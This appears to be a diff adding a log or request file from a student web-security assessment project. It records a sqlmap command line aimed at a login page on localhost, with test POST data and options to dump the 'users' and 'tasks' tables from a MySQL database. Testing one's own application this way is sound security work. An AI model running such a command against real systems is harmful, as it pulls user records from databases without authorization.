@@ -1,0 +1,3 @@
+http://localhost/webApp/project/login.php (POST)  # "D:\Amrita 4th Year\Sem_7_Projects\VAPT-WEB\webApp\sqlmap-dev\sqlmap.py" -u http://localhost/webApp/project/login.php --data email=test@test.com&password=test --dbms mysql --dump -T tasks -T users --batch --output-dir "D:\Amrita 4th Year\Sem_7_Projects\VAPT-WEB\webApp\outputs\sqlmap" -v 3
+
+email=test@test.com&password=test
